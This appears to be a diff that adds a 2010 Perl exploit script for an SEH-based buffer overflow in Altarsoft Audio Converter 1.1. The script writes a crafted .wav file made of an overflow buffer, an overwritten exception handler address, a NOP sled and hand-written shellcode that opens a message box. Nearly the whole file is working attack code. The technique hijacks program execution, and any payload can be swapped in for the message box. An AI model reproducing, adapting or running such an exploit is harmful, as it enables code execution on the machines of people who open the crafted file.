@@ -1,0 +1,77 @@
+#
+#
+# Exploit Title: Exploit Buffer Overflow Altarsoft Audio Converter 1.1(SEH)
+# Date: 16/12/2010
+# Author: C4SS!0 G0M3S
+# Software Link: http://www.altarsoft.com/downloads/AltarsoftAudioConverter.exe
+# Version: 111
+# Tested on: WIN-XP SP3 PT-BR
+# CVE: N/A
+#
+#
+#Created By C4SS!0 G0M3S
+#E-MAIL Louredo_@hotmail.com
+#Home: http://www.invasao.com.br
+#
+#
+use IO::File;
+
+if($#ARGV != 0)
+{
+sub usage
+{
+system("cls");
+system("color 4f");
+
+      print "\r\n   ||=================================================================||\n";
+	  print "   ||                                                                 ||\n";
+      print "   || Exploit Buffer Overflow Altarsoft Audio Converter 1.1(SEH)      ||\n";
+      print "   || Created BY C4SS!0 G0M3S                                         ||\n";
+      print "   || Contact Louredo_\@hotmail.com                                    ||\n";
+	  print "   ||                                                                 ||\n";
+      print "   ||=================================================================||\n\n\n";
+print("[+]Exploit: Buffer Overflow Altarsoft Audio Converter 1.1(SEH)\n");
+print("[+]Date: 16/12/2010\n");
+print("[+]Author: C4SS!0 G0M3S\n");
+print("[+]E-mail: Louredo_\@hotmail.com\n");
+print("[+]Home: http://www.invasao.com.br\n");
+print("[+]Version: 2.1\n");
+print("[+]Impact: Hich\n");
+print("[+]Tested On: WIN-XP SP3 Virtual Box\n\n");
+
+}
+usage;
+print "[-]Usage: $0 <File Name>\n";
+print "[-]Exemple: $0 music.wav\n";
+exit(0);
+}
+
+$file = $ARGV[0];
+
+$buffer = "\x41" x 4128;
+$eip = pack('V',0x004FCA3F);
+$nseh = "\xeb\x06\x90\x90";
+$seh =  pack('V',0x0042f486);
+
+$nops = "\x90" x 15;
+
+#Shellcode MessageBoxA()
+my $shellcode = 
+"\x33\xC0\x33\xC9\x33\xD2\x33\xDB\x50\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68\x75\x73\x65\x72\x54\x58\xBB\x7B\x1D\x80\x7C\x50".
+"\xFF\xD3\x90\x33\xD2\x52\xB9\x5E\x67\x30\xEF\x81\xC1\x11\x11\x11\x11\x51\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x5A\x52\x50".
+"\xB9\x30\xAE\x80\x7C\xFF\xD1\x33\xC9\x33\xD2\x33\xDB\x51\x68\x53\x20\x20\x20\x68\x47\x30\x4D\x33\x68\x53\x21\x30\x20\x68\x20\x43".
+"\x34\x53\x68\x64\x20\x42\x79\x68\x6F\x69\x74\x65\x68\x45\x78\x70\x6C\x54\x59\x53\x68\x21\x30\x20\x20\x68\x43\x34\x53\x53\x54\x5B".
+"\x6A\x40\x53\x51\x52\xFF\xD0\x33\xC0\x50\xBE\xFA\xCA\x81\x7C\xFF\xD6";
+
+
+
+$payload = $buffer.$eip.$nseh.$seh.$nops.$shellcode;
+
+open(f,">$file")or die "ERROR:\n$!\n";
+print f $payload;
+close(f);
+usage;
+print "[*]Identifying the size Shellcode\n";
+print "[*]The Shellcode Size:".length($shellcode)."\n";
+print "[*]Creating File $file\n";
+print "[*]The File $file Created Successfully\n";
